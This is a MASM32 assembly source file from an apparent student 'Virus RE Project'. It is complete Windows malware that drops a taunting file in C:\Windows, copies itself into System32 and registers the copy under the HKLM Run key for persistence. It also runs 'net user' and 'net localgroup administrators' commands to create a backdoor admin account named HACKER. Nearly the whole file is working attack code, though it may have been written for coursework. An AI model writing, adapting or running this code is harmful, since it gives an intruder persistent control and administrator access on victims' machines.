;---------------------------------------------------------------------------------------
; Virus RE Project 
; CSCI 2450-601 
; 
; Developed on a Windows 7 SP 1 virtual machine running in VMWare. 
; System must have DEP and UAC global disabled for program to run successfully. 
; Uses MASM32 Library to make system calls. 
; Available for download at: http://www.masm32.com/download.htm 
; Installation instructions: http://www.masm32.com/install.htm 
; 
; Author: Franklin D.Worrell 
; Date Due: May 2, 2016 
; Revision Date: May 1, 2016 
; --------------------------------------------------------------------------------------

MAX_FILE_PATH = 260 ; Maximum length of file name/path in Windows 7 

include \masm32\include\masm32rt.inc 
include \masm32\include\advapi32.inc 
include \masm32\include\kernel32.inc 
include \masm32\include\msvcrt.inc 
include \masm32\include\user32.inc 

includelib \masm32\lib\user32.lib 
includelib \masm32\lib\kernel32.lib 
includelib \masm32\lib\advapi32.lib 
includelib \masm32\lib\msvcrt.lib 

.386 
.stack 4096 

.data 
; For use in creating the random text file. 
sWritePerm BYTE "w", 0 
sReadPerm BYTE "r", 0 
sTextPath BYTE "C:\Windows\virus.txt", 0 
sText BYTE "Ha! Your computer's infected. Sucks to be you!", 0 
txtHandle DWORD 0 
; For use in copying the executable code to the System32 directory. 
sCodePath BYTE MAX_FILE_PATH + 1 DUP(?) 
sCodeDest BYTE "C:\Windows\System32\AnarchyInit.exe", 0 
exeOHandle DWORD 0 
exeCHandle DWORD 0 
; For use in adding the executable code to the startup registry key. 
sSubKey BYTE "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0 
keyHandle DWORD 0 
regValLeng DWORD 0 
; For use in creating the new user account with admin privileges. 
sUserLine BYTE "net user HACKER HACKER /ADD > NULL", 0 
sAdminLine BYTE "net localgroup administrators HACKER /ADD > NULL", 0 

.code 
main PROC 
	;-----------------------------------------------------------------------------------
	; Create the random text file and write to it 
	;-----------------------------------------------------------------------------------
	; Create and open the new text file. 
	PUSH OFFSET sWritePerm 		; Pass the mode to crt_fopen 
	PUSH OFFSET sTextPath 		; Pass file path to crt_fopen 
	CALL crt_fopen 				; Create and open the text file 
	MOV txtHandle, EAX 			; Store the file handle crt_fopen returned 
	
	; Write the saved text to the new file. 
	PUSH OFFSET sText 			; Pass string to crt_fprintf 
	PUSH EAX 					; Pass file handle to crt_fprintf 
	CALL crt_fprintf 			; Write text to the created file
	
	; Close the text file. 
	PUSH txtHandle 				; Pass file handle to crt_fclose 
	CALL crt_fclose 			; Close the text file 
	
	
	;-----------------------------------------------------------------------------------
	; Copy the executable code to the System32 directory. 
	;-----------------------------------------------------------------------------------
	; Get the location of the executable code. 
	PUSH MAX_FILE_PATH 			; Pass size of buffer 
	PUSH OFFSET sCodePath 		; Pass location of buffer 
	PUSH NULL 					; Pass null so name of current process returned 
	CALL GetModuleFileName 		; Get the path of file of this process 
	
	; Create a copy of the .exe in the System32 directory. 
	PUSH 0 						; Pass boolean value of false 
	PUSH OFFSET sCodeDest 		; Pass the name of the copy .exe file 
	PUSH OFFSET sCodePath 		; Pass the name of the original .exe file 
	CALL CopyFile 				; Create a copy of the .exe file 
	
	
	;-----------------------------------------------------------------------------------
	; Add the copy of the .exe to the startup registry key 
	;-----------------------------------------------------------------------------------
	; Get a handle for the startup registry key. 
	PUSH OFFSET keyHandle 		; Pass pointer to variable storing key handle 
	PUSH KEY_ALL_ACCESS 		; Pass security access to registry key 
	PUSH 0 						; Pass opening option 
	PUSH OFFSET sSubKey 		; Pass the registry subkey 
	PUSH HKEY_LOCAL_MACHINE 	; Pass the registry key of interest 
	CALL RegOpenKeyEx 			; Get a handle to the startup key 
	
	; Get the length of the destination path to pass to RegCloseKey. 
	PUSH OFFSET sCodeDest 		; Pass the string 
	CALL crt_strlen 			; Get the string's length 
	INC EAX 					; Add one to include null term char 
	MOV regValLeng, EAX 		; Store the length 
	
	; Add the copy of the executable code to the startup registry key. 
	PUSH regValLeng 			; Pass size of absolute path including null term char 
	PUSH OFFSET sCodeDest 		; Pass new registry value 
	PUSH REG_SZ 				; Pass type of new value 
	PUSH 0 						; Pass reserved field 
	PUSH NULL 					; Pass name of new key value. 
	PUSH keyHandle 				; Pass handle to the startup key 
	CALL RegSetValueEx 			; Add the .exe file to the startup key 
	
	; Close the startup registry key. 
	PUSH keyHandle 				; Pass the handle to the startup key 
	CALL RegCloseKey 			; Close the registry key 
	
	
	;-----------------------------------------------------------------------------------
	; Create a new user and give that user admin privileges. 
	;-----------------------------------------------------------------------------------
	CALL crt__flushall 			; Close all streams before system call 
	PUSH OFFSET sUserLine 		; Pass the command line argument 
	CALL crt_system 			; Create the new user account 
	PUSH OFFSET sAdminLine 		; Pass the command line argument 
	CALL crt_system 			; Give the new user account admin privileges 
	
	PUSH 0 						; Pass no errors exit code 
	CALL ExitProcess 			; Exit the process 
main ENDP 
END main